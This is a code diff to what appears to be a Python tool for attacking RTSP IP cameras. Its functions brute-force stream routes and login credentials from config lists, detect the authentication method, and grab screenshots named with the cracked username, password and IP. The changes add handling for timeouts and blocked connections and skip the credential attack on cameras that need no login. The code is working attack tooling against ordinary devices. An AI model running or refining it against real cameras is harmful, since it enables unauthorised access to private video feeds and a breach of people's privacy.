@@ -6,7 +6,7 @@ import typing
 import av
 
 from modules import utils
-from modules.rtsp import RTSPClient, Status
+from modules.rtsp import AuthMethod, RTSPClient, Status
 
 sys.path.append("..")
 import config
@@ -24,22 +24,18 @@ def attack_route(target: RTSPClient) -> typing.Union[RTSPClient, bool]:
         target.routes.append("/")
         utils.detect_auth_method(target)
         return target
-        # self.brute_queue.put(target)
-        # return
-
-    # If target is timeouted, it's probably not available and can be
-    # skipped.
-    if target.status is Status.TIMEOUT:
-        return False
 
     # Otherwise, bruteforce the routes.
     for route in config.ROUTES:
         ok = route_attack(target, route)
         if ok:
             target.routes.append(route)
-    utils.detect_auth_method(target)
-    return target
-    # self.brute_queue.put(target)
+            utils.detect_auth_method(target)
+            return target
+        # If target is timeouted or aborted connection, it's probably
+        # not available and can be skipped.
+        if target.status is Status.TIMEOUT or target.status is Status.BLOCKED:
+            return False
 
 
 def route_attack(target: RTSPClient, route) -> bool:
@@ -59,6 +55,14 @@ def route_attack(target: RTSPClient, route) -> bool:
     target.create_packet(route)
     try:
         target.send_packet()
+    except socket.timeout as e:
+        logger.debug(f"Skipping {target.ip}: {str(e)}")
+        target.status = Status.TIMEOUT
+        return False
+    except ConnectionResetError as e:
+        logger.debug(f"Skipping {target.ip}: {str(e)}")
+        target.status = Status.BLOCKED
+        return False
     except Exception as e:
         logger.debug(f"Send failed for {attack_url}: {str(e)}")
         return False
@@ -80,20 +84,30 @@ def route_attack(target: RTSPClient, route) -> bool:
 
 
 def attack_credentials(target: RTSPClient):
+    # If stream responds positively to no credentials, it means
+    # it doesn't require them and the attack can be skipped.
+    if target.auth_method is AuthMethod.NONE:
+        ok = credentials_attack(target, ":")
+        if ok:
+            return target
+        else:
+            utils.detect_auth_method(target)
+
+    # Otherwise, bruteforce the routes.
     for cred in config.CREDENTIALS:
-        utils.detect_auth_method(target)
         ok = credentials_attack(target, cred)
         if ok:
             target.credentials = cred
             return target
         if target.status is Status.TIMEOUT:
             return False
+        utils.detect_auth_method(target)
 
     # Some cameras run GST RTSP Server which prioritizes 401 over 404 contrary to most cameras.
     # For these cameras, running another route attack will solve the problem.
-    #if not target.route_found or not target.credentials_found or not target.available:
-     #   result = attack_route(target)
-     #   return bool(result) and validate_stream(target)
+    # if not target.route_found or not target.credentials_found or not target.available:
+    #   result = attack_route(target)
+    #   return bool(result) and validate_stream(target)
 
 
 def credentials_attack(target: RTSPClient, cred):
@@ -193,7 +207,9 @@ def get_screenshot(target: RTSPClient) -> str:
     password: str
     file_name: str
     username, password = target.credentials.split(":")
-    file_name = utils.escape_chars(f"{username}_{password}_{target.ip}_{target.port}_{target.route.lstrip('/')}.jpg")
+    file_name = utils.escape_chars(
+        f"{username}_{password}_{target.ip}_{target.port}_{target.route.lstrip('/')}.jpg"
+    )
     file_path = config.PICS_FOLDER / file_name
 
     try:
